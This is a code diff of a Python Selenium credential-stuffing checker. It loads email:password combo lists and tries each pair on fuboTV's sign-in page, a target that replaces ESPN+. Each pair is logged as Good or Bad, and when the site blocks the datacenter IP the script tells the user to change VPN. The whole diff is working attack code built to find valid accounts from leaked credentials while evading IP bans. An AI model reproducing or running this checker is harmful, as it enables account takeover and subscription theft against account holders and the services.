@@ -7,8 +7,8 @@ from selenium.webdriver.chrome.options import Options
 from selenium import webdriver
 from pathlib import Path
 
-file_directory = str(Path(__file__).parent)+'/espn+'
-page = 'https://plus.espn.com/'
+file_directory = str(Path(__file__).parent)+'/fubo'
+page = 'https://www.fubo.tv/signin'
 get_current_ip = 'https://www.iplocation.net/'
 info_list =[]
 request = requests.get(get_current_ip)
@@ -34,48 +34,33 @@ with open(file_directory, 'r') as espn:
 		passwords.append(line.split(':')[1].strip())
 
 for index in range(len(users)):
-
 	with open('account_results','a') as account_results:
-	
 		try:
-		
 			browser = webdriver.Chrome()
 			browser.set_window_size(500,700)
 			browser.get(page)
-			time.sleep(5)
-			login_button = browser.find_element_by_xpath('//*[@id="root"]/nav/div[3]/button')
-			login_button.click()
-			browser.switch_to.frame(0)
 			time.sleep(1)
-			original_login = browser.find_element_by_xpath('/html/body/div[1]/div/div/footer/p/a')
-			original_login.click()
-			email_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/section/section/form/section/div[1]/div/label/span[2]/input')
+			email_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div[2]/div[1]/main/div/div[1]/form/div/div[1]/div/input')
 			email_box.send_keys(users[index])
-			password_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/section/section/form/section/div[2]/div/label/span[2]/input')
+			time.sleep(1)
+			password_box = browser.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div[2]/div[1]/main/div/div[1]/form/div/div[2]/div[2]/div/input')
 			password_box .send_keys(passwords[index])
-			log_in = browser.find_element_by_xpath('//*[@id="did-ui-view"]/div/section/section/form/section/div[3]/button')
+			time.sleep(1)
+			log_in = browser.find_element_by_xpath('//*[@id="root"]/div/div/div/div/div[2]/div[1]/main/div/div[1]/form/div/div[3]/button')
 			log_in.click()
-			time.sleep(6)
-			invalid_email_text = browser.find_element_by_xpath('//*[@id="did-ui-view"]/div/section/div/div/div')
+			time.sleep(1)
+			invalid_email_text = browser.find_element_by_xpath('/html/body/div[1]/div/div/div/div/div[2]/div[1]/main/div/div[1]/form/div/div[3]')
 			error = invalid_email_text.text
-			if 'The credentials you entered are incorrect' in str(error):
+			if 'That email and password combination is not valid.' in str(error):
 				account_results.write(users[index]+':'+passwords[index]+' ---> Bad \n')
+				browser.close()
+			if 'Something went wrong' in str(error):
+				print('Please change vpn, this datacenter is banned\n')
+				print('Finished at combo {}\n'.format(users[index]+':'+passwords[index]))
+				browser.close()
+				exit()
 			browser.close()
-			
-		except NoSuchElementException:
-		
+		except (NoSuchElementException, ElementClickInterceptedException):
 			account_results.write(users[index]+':'+passwords[index]+' ---> Good \n')
 			browser.close()
 			continue
-			
-		except ElementClickInterceptedException:
-		
-			print('Intercepted, ending.\n')
-			print('(stopped at combo {} \n'.format(users[index], passwords[index])
-			break
-			
-		except Exception as e:
-		
-			print(e)
-			print('(stopped at combo {} \n'.format(users[index], passwords[index])
-			break
